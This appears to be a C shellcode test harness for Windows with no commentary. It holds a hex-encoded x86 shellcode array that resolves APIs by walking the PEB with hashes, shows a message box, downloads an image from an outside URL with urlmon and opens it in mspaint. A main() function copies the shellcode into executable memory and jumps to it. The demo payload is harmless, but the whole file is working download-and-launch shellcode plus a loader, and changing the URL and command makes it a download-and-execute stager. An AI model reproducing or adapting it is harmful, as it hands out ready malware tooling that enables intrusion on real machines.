#include <windows.h>
#include <stdio.h> 



char shellcode[] = 



"\xe8\x00\x00\x00\x00\x5a\x8d\x52"
"\xfb\x89\xe5\x81\xec\x00\x10\x00"
"\x00\x52\xbb\x8e\xfe\x1f\x4b\xe8"
"\x11\x01\x00\x00\x5a\x55\x52\x89"
"\xc5\x8d\xb2\xc8\x01\x00\x00\x8d"
"\xba\xd8\x01\x00\x00\xe8\x31\x01"
"\x00\x00\x5a\x5d\x55\x52\x8d\x82"
"\xf0\x01\x00\x00\x50\xff\x92\xe0"
"\x01\x00\x00\x5a\x5d\x55\x52\x89"
"\xc5\x8d\xb2\xe4\x01\x00\x00\x8d"
"\xba\xec\x01\x00\x00\xe8\x09\x01"
"\x00\x00\x5a\x5d\x55\x52\x8d\x82"
"\x07\x02\x00\x00\x50\xff\x92\xe0"
"\x01\x00\x00\x5a\x5d\x55\x52\x89"
"\xc5\x8d\xb2\xfb\x01\x00\x00\x8d"
"\xba\x03\x02\x00\x00\xe8\xe1\x00"
"\x00\x00\x5a\x5d\x6a\x00\x68\x20"
"\x4e\x6f\x77\x68\x6d\x61\x67\x65"
"\x68\x65\x72\x20\x49\x68\x46\x6c"
"\x6f\x77\x68\x69\x6e\x67\x20\x68"
"\x6c\x6f\x61\x64\x68\x44\x6f\x77"
"\x6e\x89\xe0\x6a\x00\x6a\x00\x50"
"\x6a\x00\x89\xd3\xff\x92\xec\x01"
"\x00\x00\x89\xda\x8d\xb2\x12\x02"
"\x00\x00\x8d\xba\x62\x02\x00\x00"
"\x6a\x00\x6a\x00\x57\x56\x6a\x00"
"\xff\x92\x03\x02\x00\x00\x89\xda"
"\x6a\x00\x6a\x00\x6a\x00\x6a\x00"
"\x6a\x00\x6a\x00\x6a\x00\x6a\x00"
"\x6a\x00\x6a\x00\x6a\x00\x6a\x00"
"\x6a\x00\x6a\x00\x6a\x00\x6a\x00"
"\x6a\x00\x89\xe0\x6a\x00\x6a\x00"
"\x6a\x00\x6a\x00\x89\xe1\x8d\xb2"
"\x6e\x02\x00\x00\x51\x50\x6a\x00"
"\x6a\x00\x6a\x00\x6a\x00\x6a\x00"
"\x6a\x00\x56\x6a\x00\xff\x92\xd8"
"\x01\x00\x00\x89\xda\x6a\x00\xff"
"\x92\xdc\x01\x00\x00\xfc\x31\xff"
"\x64\x8b\x3d\x30\x00\x00\x00\x8b"
"\x7f\x0c\x8b\x7f\x14\x8b\x77\x28"
"\x31\xd2\x66\xad\x84\xc0\x74\x11"
"\x3c\x41\x72\x06\x3c\x5a\x77\x02"
"\x0c\x20\xc1\xc2\x07\x30\xc2\xeb"
"\xe9\x39\xda\x8b\x47\x10\x8b\x3f"
"\x75\xdb\xc3\x89\xea\x03\x52\x3c"
"\x8b\x52\x78\x01\xea\x8b\x5a\x20"
"\x01\xeb\x31\xc9\x57\x56\x8b\x36"
"\x8b\x3b\x01\xef\x52\x31\xd2\xc1"
"\xc2\x07\x32\x17\x47\x80\x3f\x00"
"\x75\xf5\x92\x5a\x39\xf0\x74\x0c"
"\x83\xc3\x04\x41\x39\x4a\x18\x75"
"\xdf\x5e\x5f\xc3\x5e\x5f\xad\x56"
"\x53\x89\xeb\x89\xde\x03\x5a\x24"
"\x8d\x04\x4b\x0f\xb7\x00\x8d\x04"
"\x86\x03\x42\x1c\x8b\x00\x01\xf0"
"\xab\x5b\x5e\x83\xc3\x04\x41\x81"
"\x3e\xff\xff\x00\x00\x75\xad\xc3"
"\xc7\x8a\x31\x46\x19\x2b\x90\x95"
"\x26\x80\xac\xc8\xff\xff\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00"
"\x02\x00\x00\x00\x0d\x68\xbc\xab"
"\xff\xff\x00\x00\x03\x00\x00\x00"
"\x75\x73\x65\x72\x33\x32\x2e\x64"
"\x6c\x6c\x00\x99\x23\x5d\xd9\xff"
"\xff\x00\x00\x04\x00\x00\x00\x75"
"\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c"
"\x6c\x00\x68\x74\x74\x70\x3a\x2f"
"\x2f\x69\x6d\x61\x67\x65\x73\x2e"
"\x66\x72\x65\x65\x69\x6d\x61\x67"
"\x65\x73\x2e\x63\x6f\x6d\x2f\x69"
"\x6d\x61\x67\x65\x73\x2f\x6c\x61"
"\x72\x67\x65\x2d\x70\x72\x65\x76"
"\x69\x65\x77\x73\x2f\x31\x39\x39"
"\x2f\x73\x75\x6e\x66\x6c\x6f\x77"
"\x65\x72\x73\x2d\x36\x2d\x31\x33"
"\x39\x32\x39\x35\x31\x2e\x6a\x70"
"\x67\x00\x66\x6c\x6f\x77\x65\x72"
"\x2e\x6a\x70\x65\x67\x00\x6d\x73"
"\x70\x61\x69\x6e\x74\x2e\x65\x78"
"\x65\x20\x66\x6c\x6f\x77\x65\x72"
"\x2e\x6a\x70\x65\x67";






int main(int argc, char **argv) {



	
	
	int i = 0, len = 0, target_addy = 0, offset = 0x0;

	void*stage = VirtualAlloc(0, 0x1000, 0x1000,0x40 );

	printf("[*] Memory allocated: 0x%08x\n", stage);

	len = sizeof(shellcode);

	printf("[*] Size of Shellcode: %08x\n", len);

	memmove(stage, shellcode, 0x1000);

	printf("[*] Shellcode copied\n");

	target_addy = (char*)stage + offset;

	printf("[*] Adjusting offset: 0x%08x\n", target_addy);
	
	__asm {
		int 3
		mov eax, target_addy
		jmp eax
	}
}